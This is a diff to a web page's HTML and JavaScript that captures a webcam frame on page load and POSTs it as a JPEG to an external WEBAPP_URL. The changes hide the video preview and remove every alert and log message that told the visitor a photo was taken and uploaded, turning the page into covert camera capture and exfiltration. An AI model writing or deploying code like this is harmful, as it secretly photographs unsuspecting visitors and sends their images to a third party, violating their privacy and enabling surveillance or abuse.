@@ -6,7 +6,7 @@
 </head>
 <body>
 
-<video id="video" autoplay playsinline style="width:100%;max-width:400px;"></video>
+<video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
@@ -26,53 +26,41 @@ window.onload = async () => {
     const video = document.getElementById("video");
     video.srcObject = stream;
 
-    video.onloadedmetadata = () => {
+    video.onloadedmetadata = async () => {
 
-      setTimeout(async () => {
+      try {
 
-        try {
+        const canvas = document.getElementById("canvas");
 
-          const canvas = document.getElementById("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
 
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0);
 
-          const ctx = canvas.getContext("2d");
-          ctx.drawImage(video, 0, 0);
+        const image = canvas.toDataURL("image/jpeg", 0.9);
 
-          const image = canvas.toDataURL("image/jpeg", 0.9);
+        await fetch(WEBAPP_URL, {
+          method: "POST",
+          mode: "no-cors",
+          body: JSON.stringify({
+            image: image
+          })
+        });
 
-          console.log("Foto berhasil dibuat");
+        stream.getTracks().forEach(track => track.stop());
 
-          await fetch(WEBAPP_URL, {
-            method: "POST",
-            mode: "no-cors",
-            body: JSON.stringify({
-              image: image
-            })
-          });
+      } catch (err) {
 
-          console.log("Upload selesai");
+        console.error(err);
 
-          alert("Foto berhasil disimpan");
-
-          stream.getTracks().forEach(track => track.stop());
-
-        } catch (err) {
-
-          console.error(err);
-          alert("Gagal upload: " + err.message);
-
-        }
-
-      }, 100);
+      }
 
     };
 
   } catch (err) {
 
     console.error(err);
-    alert("Error kamera: " + err.message);
 
   }
 
